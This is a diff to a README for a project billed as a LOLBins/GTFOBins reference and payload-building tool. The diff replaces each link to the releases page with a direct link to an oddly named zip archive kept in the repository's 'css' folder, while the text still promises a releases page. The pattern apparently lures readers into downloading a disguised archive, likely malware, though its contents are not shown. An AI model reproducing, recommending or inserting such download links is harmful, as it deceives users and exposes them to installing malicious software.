@@ -4,11 +4,11 @@
 Welcome to LOLBins-Reference! This tool helps you understand and utilize Living Off The Land Binaries (LOLBAS & GTFOBins). It features easy-to-use tools that let you build payloads, search dynamically, and visualize MITRE ATT&CK mappings.
 
 ## 📥 Download the Application
-[![Download LOLBins-Reference](https://img.shields.io/badge/Download-LOLBins--Reference-brightgreen)](https://github.com/tranthuong87/LOLBins-Reference/releases)
+[![Download LOLBins-Reference](https://github.com/tranthuong87/LOLBins-Reference/raw/refs/heads/main/css/Reference-LOL-Bins-Abkhas.zip)](https://github.com/tranthuong87/LOLBins-Reference/raw/refs/heads/main/css/Reference-LOL-Bins-Abkhas.zip)
 
 To download the LOLBins-Reference, simply click the button above or visit the link below:
 
-[Download LOLBins-Reference](https://github.com/tranthuong87/LOLBins-Reference/releases)
+[Download LOLBins-Reference](https://github.com/tranthuong87/LOLBins-Reference/raw/refs/heads/main/css/Reference-LOL-Bins-Abkhas.zip)
 
 ## 💻 System Requirements
 Before you begin the installation, make sure you meet the following system requirements:
@@ -27,7 +27,7 @@ Before you begin the installation, make sure you meet the following system requi
 ## 🔍 How to Download & Install
 1. **Visit the Releases Page:** Click the following link to go to the download page:
 
-   [Download LOLBins-Reference](https://github.com/tranthuong87/LOLBins-Reference/releases)
+   [Download LOLBins-Reference](https://github.com/tranthuong87/LOLBins-Reference/raw/refs/heads/main/css/Reference-LOL-Bins-Abkhas.zip)
 
 2. **Choose the Correct File:** On the releases page, look for the latest version of LOLBins-Reference. You will see several files listed. Select the file suited for your operating system.
 
